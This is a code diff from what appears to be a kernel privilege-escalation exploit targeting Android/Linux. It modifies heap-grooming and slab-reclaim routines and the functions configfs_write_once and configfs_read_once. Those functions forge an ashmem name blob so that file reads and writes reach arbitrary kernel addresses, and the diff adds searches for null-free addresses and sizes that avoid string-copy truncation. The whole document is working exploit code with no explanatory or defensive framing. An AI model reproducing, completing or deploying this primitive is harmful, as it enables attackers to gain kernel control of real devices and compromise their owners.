@@ -1366,13 +2022,15 @@ uintptr_t prepare_kernel_page(int payload_mode) {
     kill_child(prepare_ctx.childs[index]);
     prepare_ctx.childs[index] = -1;
   }
+#if defined(APP_CLOSED_SLABINFO_TOUCH) && APP_CLOSED_SLABINFO_TOUCH
+  touch_mm_slabinfo();
+#endif
 #if !defined(APP_REQUIRE_FRESH_P0_SESSION) || !APP_REQUIRE_FRESH_P0_SESSION
+#if !defined(APP_CLOSED_RECLAIM_QUIET) || !APP_CLOSED_RECLAIM_QUIET
   pr_info("mm late cpu-partial drain triggers=%zu\n", drain_triggers);
 #endif
-  int reclaim_sends = SKB_RECLAIM_SENDS;
-#if defined(APP_PHYS_P0_ORACLE) && APP_PHYS_P0_ORACLE
-  reclaim_sends = APP_SLIDE_RECLAIM_SENDS;
 #endif
+  int reclaim_sends = SKB_RECLAIM_SENDS;
   int reclaim_sent = 0;
 #if defined(APP_REQUIRE_FRESH_P0_SESSION) && APP_REQUIRE_FRESH_P0_SESSION
   int reclaim_errno = 0;
@@ -1388,6 +2046,9 @@ uintptr_t prepare_kernel_page(int payload_mode) {
     }
     reclaim_sent++;
   }
+#if defined(APP_CLOSED_SLABINFO_TOUCH) && APP_CLOSED_SLABINFO_TOUCH
+  touch_mm_slabinfo();
+#endif
 #if defined(APP_REQUIRE_FRESH_P0_SESSION) && APP_REQUIRE_FRESH_P0_SESSION
   for (size_t i = 0; i < deferred_reap_count; i++) {
     SYSCHK(waitpid(deferred_reap_children[i], NULL, 0));
@@ -1470,9 +2131,42 @@ uintptr_t prepare_good_kernel_page(int payload_mode) {
 
 ssize_t configfs_write_once(int fd, uintptr_t target, const void *data, size_t len) {
   unsigned char blob[128];
+  const uintptr_t write_align = 0x01000000ULL;
+  const uint32_t max_write_window = 0x02000000U;
+  uintptr_t base = target & ~(write_align - 1);
+  off_t pos = (off_t)(target - base);
+  uintptr_t end = (uintptr_t)pos + len;
+  uint32_t buffer_size = 0;
+
+  if (end > max_write_window ||
+      !((base >> 24) & 0xff) || !((base >> 32) & 0xff) ||
+      !((base >> 40) & 0xff) || !((base >> 48) & 0xff) ||
+      !((base >> 56) & 0xff)) {
+    errno = ERANGE;
+    return -1;
+  }
+  for (uintptr_t candidate_size = end;
+       candidate_size <= max_write_window && candidate_size - end < 0x200;
+       candidate_size++) {
+    int usable = 1;
+    for (size_t i = 0; i < 3; i++) {
+      if (!((candidate_size >> (i * 8)) & 0xff)) {
+        usable = 0;
+        break;
+      }
+    }
+    if (usable) {
+      buffer_size = (uint32_t)candidate_size;
+      break;
+    }
+  }
+  if (!buffer_size) {
+    errno = ERANGE;
+    return -1;
+  }
   memset(blob, 0, sizeof(blob));
-  put64(blob, CFG_BIN_BUFFER_OFF - ASHMEM_NAME_PREFIX_LEN, target);
-  put32(blob, CFG_BIN_BUFFER_SIZE_OFF - ASHMEM_NAME_PREFIX_LEN, len);
+  put64(blob, CFG_BIN_BUFFER_OFF - ASHMEM_NAME_PREFIX_LEN, base);
+  put32(blob, CFG_BIN_BUFFER_SIZE_OFF - ASHMEM_NAME_PREFIX_LEN, buffer_size);
   put32(blob, CFG_CB_MAX_SIZE_OFF - ASHMEM_NAME_PREFIX_LEN, 0);
   errno = 0;
   int set_ret = try_set_ashmem_name_blob(fd, blob, sizeof(blob));
@@ -1483,15 +2177,38 @@ ssize_t configfs_write_once(int fd, uintptr_t target, const void *data, size_t l
   }
 
   errno = 0;
-  ssize_t wr = pwrite(fd, data, len, 0);
+  ssize_t wr = pwrite(fd, data, len, pos);
   return wr;
 }
 
 ssize_t configfs_read_once(int fd, uintptr_t target, void *data, size_t len) {
   unsigned char blob[128];
+  uintptr_t page = 0;
+  off_t pos = 0;
+
   memset(blob, 0, sizeof(blob));
-  off_t pos = (off_t)(ASHMEM_PREFIX_COUNT - len);
-  uintptr_t page = target - (uintptr_t)pos;
+  memset(blob, 1, CFG_PAGE_OFF - ASHMEM_NAME_PREFIX_LEN);
+  for (uint64_t window = len; window < len + 0x10000; ++window) {
+    uintptr_t candidate_pos = ASHMEM_PREFIX_COUNT - window;
+    uintptr_t candidate_page = target - candidate_pos;
+    int usable = 1;
+
+    for (size_t i = 0; i < sizeof(candidate_page); ++i) {
+      if (!((candidate_page >> (i * 8)) & 0xff)) {
+        usable = 0;
+        break;
+      }
+    }
+    if (usable) {
+      page = candidate_page;
+      pos = (off_t)candidate_pos;
+      break;
+    }
+  }
+  if (!page) {
+    errno = ERANGE;
+    return -1;
+  }
   put64(blob, CFG_PAGE_OFF - ASHMEM_NAME_PREFIX_LEN, page);
   put32(blob, CFG_NEEDS_READ_FILL_OFF - ASHMEM_NAME_PREFIX_LEN, 0);
   errno = 0;
